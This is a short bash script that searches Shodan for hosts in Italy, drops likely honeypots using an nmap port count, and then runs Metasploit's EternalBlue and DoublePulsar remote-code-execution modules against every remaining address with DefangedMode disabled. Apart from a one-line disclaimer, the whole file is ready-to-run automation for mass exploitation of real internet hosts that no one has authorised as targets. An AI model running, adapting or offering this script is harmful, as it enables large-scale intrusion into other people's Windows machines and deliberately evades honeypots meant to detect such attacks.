#!/bin/bash
#(c) Dylvie Shwartz 2024 - Dot not use it to harm
#Run a query on shodan excluding honeypots and run a metasploit exploit on assets
#need a shodan license

#clean screen
clear

#use shodan filter to retrieve ips and filter honeypots
#add search terms before \\-tag:honeypot
#remove honeypots
shodan search --fields ip --limit 100 country:it \\-tag:honeypot | 
	while read ip; do
		#export ip to use in awk
		export ip
		#filter honeypots < 10 ports
		#use nmap to scan top 20 ports
		nmap -Pn --disable-arp-ping --open --top-ports=20 $ip | 
			awk '/^[0-9]+\/tcp/ {cpt++} END {if (cpt < 10) print ENVIRON["ip"]}'
	done | 
		xargs echo | 
		while read -r ips; do
			#commands to execute in metasploit
			commands=$(echo "
#put your metasploit commands after
use windows/smb/ms17_010_eternalblue
setg LHOST 10.0.2.28
setg RHOSTS $ips
run
use windows/smb/smb_doublepulsar_rce
run DefangedMode=false
" | tr "\n" "; ")
			#run metasploit exploit
			msfconsole -q -x "$commands"
		done
